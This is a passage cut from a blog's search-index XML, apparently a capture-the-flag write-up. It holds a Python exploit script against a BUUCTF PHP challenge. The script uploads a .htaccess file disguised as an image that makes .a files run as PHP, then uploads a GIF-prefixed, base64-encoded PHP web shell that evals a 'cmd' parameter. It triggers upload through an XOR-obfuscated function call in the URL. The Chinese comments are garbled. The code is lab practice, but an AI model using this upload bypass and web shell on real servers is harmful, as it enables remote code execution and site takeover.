class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-comment"># æ‰§è¡Œget_the_flagå‡½æ•°</span><br>session = requests.session()<br>htaccess_content = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337</span><br><span class="hljs-string">AddType application/x-httpd-php .a</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>files_htaccess = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_hta = session.post(url, files=files_htaccess)<br><span class="hljs-built_in">print</span>(res_hta.text)<br>shell_file = <span class="hljs-string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span><br>files_shell = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;shell.a&#x27;</span>, shell_file, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_jpg = session.post(url, files=files_shell)<br><br><span class="hljs-built_in">print</span>(res_jpg.text)  <span class="hljs-comment"># æ‰“å°è·¯å¾„</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
